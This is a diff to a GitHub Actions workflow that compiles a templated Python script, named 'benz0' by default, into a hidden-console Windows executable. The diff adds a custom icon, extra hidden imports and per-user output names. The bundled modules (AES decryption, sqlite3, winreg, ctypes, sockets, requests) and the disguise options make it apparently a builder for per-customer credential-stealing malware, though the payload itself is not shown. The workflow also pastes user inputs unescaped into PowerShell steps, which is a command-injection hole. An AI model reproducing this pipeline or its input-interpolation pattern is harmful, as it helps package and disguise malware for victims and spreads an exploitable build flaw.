@@ -16,6 +16,10 @@ on:
         required: false
         type: string
         default: 'benz0'
+      icon_base64:
+        description: 'Icon file as base64 (optional)'
+        required: false
+        type: string
 
 jobs:
   build:
@@ -33,6 +37,13 @@ jobs:
         run: |
           pip install pyinstaller pycryptodome requests
 
+      - name: Decode icon (if provided)
+        if: github.event.inputs.icon_base64 != ''
+        shell: pwsh
+        run: |
+          $bytes = [Convert]::FromBase64String("${{ github.event.inputs.icon_base64 }}")
+          [IO.File]::WriteAllBytes("icon.ico", $bytes)
+
       - name: Generate build script from template
         shell: pwsh
         run: |
@@ -47,20 +58,25 @@ jobs:
       - name: Build EXE with all hidden imports
         run: |
           $filename = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}" } else { "benz0" }
+          $icon_arg = if (Test-Path "icon.ico") { "--icon=icon.ico" } else { "" }
           pyinstaller --onefile --noconsole `
             --hidden-import=Crypto `
             --hidden-import=Crypto.Cipher `
             --hidden-import=Crypto.Cipher.AES `
             --hidden-import=Crypto.Util `
             --hidden-import=Crypto.Protocol `
+            --hidden-import=Crypto.Hash `
+            --hidden-import=Crypto.Random `
             --hidden-import=requests `
             --hidden-import=urllib `
             --hidden-import=urllib.request `
+            --hidden-import=urllib.parse `
             --hidden-import=json `
             --hidden-import=sqlite3 `
             --hidden-import=zipfile `
             --hidden-import=shutil `
             --hidden-import=ctypes `
+            --hidden-import=ctypes.wintypes `
             --hidden-import=winreg `
             --hidden-import=threading `
             --hidden-import=subprocess `
@@ -74,8 +90,21 @@ jobs:
             --hidden-import=logging `
             --hidden-import=tempfile `
             --hidden-import=glob `
+            --hidden-import=struct `
+            --hidden-import=socket `
+            --hidden-import=ssl `
+            --hidden-import=hashlib `
+            --hidden-import=hmac `
+            --hidden-import=urllib3 `
+            --hidden-import=urllib3.util `
+            --hidden-import=urllib3.poolmanager `
+            --hidden-import=http.client `
+            --hidden-import=io `
+            --hidden-import=binascii `
+            $icon_arg `
             "${filename}.py"
-          $exe_name = "benz0_${{ github.event.inputs.user_id }}.exe"
+          $exe_name = "${{ github.event.inputs.file_name }}.exe"
+          if ("${{ github.event.inputs.file_name }}" -eq "") { $exe_name = "benz0_${{ github.event.inputs.user_id }}.exe" }
           if (Test-Path "dist\${filename}.exe") {
             Rename-Item -Path "dist\${filename}.exe" -NewName $exe_name
           } else {
@@ -87,4 +116,4 @@ jobs:
         uses: actions/upload-artifact@v4
         with:
           name: benz0_${{ github.event.inputs.user_id }}
-          path: dist/benz0_${{ github.event.inputs.user_id }}.exe
+          path: dist/${{ github.event.inputs.file_name }}.exe
